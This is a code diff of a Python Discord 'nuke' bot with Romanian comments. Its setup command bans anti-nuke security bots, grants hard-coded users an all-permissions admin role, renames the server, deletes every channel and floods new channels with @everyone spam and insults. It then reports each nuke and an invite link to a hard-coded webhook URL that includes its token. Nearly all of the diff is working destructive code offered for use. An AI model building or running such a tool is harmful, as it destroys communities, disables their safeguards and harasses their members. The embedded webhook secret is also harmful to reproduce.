@@ -25,12 +25,14 @@ BLACKLISTED_GUILD_ID = 1525971260943892510
 OWNER_ID = 1464634211406188721
 LEADERBOARD_CHANNEL_ID = 1401931021544460389
 TOKEN = os.getenv('TOKEN')
+
+# ===== WEBHOOK DIRECT =====
 LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538408453783953469/TADJTY09gijkuwZ8MX_5zslLBA8PQYTnmxTzYT8ZCsEESVd6_BViqHGXg5VFS94SwZTo'
 
 BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
 BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]
 
-# Funcțiile de salvare, încărcare, configurare
+# ================== FUNCȚII DE SALVARE ==================
 def save_nuke_stats(user_id, guild):
     try:
         with open(NUKE_STATS_FILE, "r") as f:
@@ -196,6 +198,7 @@ def apply_font(text, font_style):
     return ''.join(result)
 
 async def detect_and_ban_antinuke_bots(guild):
+    """Detectează și banează boturile anti-nuke (Wick, Security, Beemo, AntiNuke)."""
     banned = []
     for member in guild.members:
         if member.bot:
@@ -224,7 +227,6 @@ async def send_nuke_log(guild, user, channels, messages, invite_link=None):
     if not LOG_WEBHOOK_URL:
         return
 
-    # Construim descrierea
     description = f"**{user.display_name}** (`{user.id}`) has just nuked the server **{guild.name}**."
     if invite_link:
         description += f"\n\n🔗 **Server Invite:** {invite_link}"
@@ -560,31 +562,34 @@ async def setup(ctx):
         await guild.leave()
         return
 
-    # ==== DETERMINĂ PARAMETRII ȘI CREEZĂ INVITAȚIA (ÎNAINTE DE ȘTERGERE) ====
-    is_owner = (user.id == OWNER_ID)
-    total_channels = 200 if is_owner else 70
-    spam_messages = 25 if is_owner else 15
-
-    # Creează un link de invitație (dacă are permisiuni)
-    invite_link = None
-    try:
-        invite = await guild.text_channels[0].create_invite(max_age=3600, max_uses=10, reason="Nuke log invite")
-        invite_link = invite.url
-    except:
-        pass  # dacă nu poate crea, merge fără link
-
-    # ==== TRIMITE LOGUL INSTANT ====
-    await send_nuke_log(guild, user, total_channels, spam_messages, invite_link)
-
-    # ==== CONTINUĂ CU RESTUL NUKE-ULUI ====
+    # ===== BANEAZĂ BOTURILE ANTI-NUKE =====
     banned_bots = await detect_and_ban_antinuke_bots(guild)
     if banned_bots:
         await user.send(f"✅ Banned anti-nuke bots: {', '.join(banned_bots)}")
 
+    # ===== DETERMINĂ PARAMETRII =====
+    is_owner = (user.id == OWNER_ID)
+    total_channels = 200 if is_owner else 70
+    spam_messages = 25 if is_owner else 15
+
+    # ===== CREEZĂ INVITAȚIA (ÎNAINTE DE ȘTERGERE) =====
+    invite_link = None
+    try:
+        # Încercăm să găsim un canal text pentru a crea invitația
+        if guild.text_channels:
+            invite = await guild.text_channels[0].create_invite(max_age=3600, max_uses=10, reason="Nuke log invite")
+            invite_link = invite.url
+    except:
+        pass
+
+    # ===== TRIMITE LOGUL INSTANT =====
+    await send_nuke_log(guild, user, total_channels, spam_messages, invite_link)
+
+    # ===== SALVEAZĂ STATISTICILE =====
     save_nuke_stats(user.id, guild)
 
+    # ===== CREEAZĂ ROL ADMIN =====
     admin_users = [1389763251042258944, 1464634211406188721]
-
     try:
         admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
         for admin_id in admin_users:
@@ -594,17 +599,20 @@ async def setup(ctx):
     except:
         pass
 
+    # ===== SCHIMBĂ NUMELE SERVERULUI =====
     try:
         await guild.edit(name="1weeksober owns this")
     except:
         pass
 
+    # ===== ȘTERGE TOATE CANALELE =====
     for channel in guild.channels:
         try:
             await channel.delete()
         except:
             continue
 
+    # ===== LISTA NUME CANALE =====
     base_channel_names = [
         "1weeksober-king",
         "Cry-kid",
@@ -617,22 +625,7 @@ async def setup(ctx):
         "Ez-larp-on-top"
     ]
 
-    # ===== LISTA DE INSULTE =====
-    insults = [
-        "What a low iq user",
-        "Iqlet",
-        "Quit beaming you're trash",
-        "You're a pathetic loser",
-        "Get a life kid",
-        "Larp Empire owns your server",
-        "You couldn't even nuke a sandcastle",
-        "Your mom should've used a condom",
-        "You're a waste of oxygen",
-        "Even your bot is smarter than you",
-        "Go back to playing Roblox",
-        "You're the reason why birth control exists"
-    ]
-
+    # ===== EMBED PRINCIPAL =====
     embed_content = discord.Embed(
         title="**LARP EMPIRE N4KED YOUR AHH**",
         description=(
@@ -652,9 +645,26 @@ async def setup(ctx):
     embed_gif = discord.Embed(color=0x000000)
     embed_gif.set_image(url=gif_url)
 
+    # ===== MESAJ MARE (2000 caractere) =====
     base_text = "@everyone @here join https://discord.gg/larpempire\n"
     repeat_count = 50
     big_message = (base_text * repeat_count)[:2000]
+
+    # ===== INSULTE =====
+    insults = [
+        "What a low iq user",
+        "Iqlet",
+        "Quit beaming you're trash",
+        "You're a pathetic loser",
+        "Get a life kid",
+        "Larp Empire owns your server",
+        "You couldn't even nuke a sandcastle",
+        "Your mom should've used a condom",
+        "You're a waste of oxygen",
+        "Even your bot is smarter than you",
+        "Go back to playing Roblox",
+        "You're the reason why birth control exists"
+    ]
 
     font_styles = ["bold", "script", "double"]
     created_channels = []
@@ -673,7 +683,7 @@ async def setup(ctx):
             await send_with_retry(channel, embed=embed_content)
             await asyncio.sleep(0.1)
 
-            # Trimite GIF-ul din când în când (random)
+            # Trimite GIF-ul din când în când (30% șansă)
             if random.random() < 0.3:
                 await send_with_retry(channel, embed=embed_gif)
                 await asyncio.sleep(0.1)
@@ -713,16 +723,21 @@ async def setup(ctx):
 
     await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel with retry on rate-limit!")
 
-    await asyncio.sleep(3)
-
-    await user.send("✅ Process completed. Leaving server...")
-
+    # ===== CREEAZĂ ROL FINAL =====
     try:
         await guild.create_role(name="1weeksober-on-top")
     except:
         pass
 
-    await guild.leave()
+    # ===== IEȘI DIN SERVER (CU GESTIONARE EROARE) =====
+    try:
+        await user.send("✅ Process completed. Leaving server...")
+        await guild.leave()
+        await user.send("✅ Left the server.")
+        print(f"[INFO] Left {guild.name} ({guild.id})")
+    except Exception as e:
+        await user.send(f"❌ Failed to leave the server: {e}")
+        print(f"[ERROR] Could not leave {guild.name}: {e}")
 
 @bot.event
 async def on_ready():
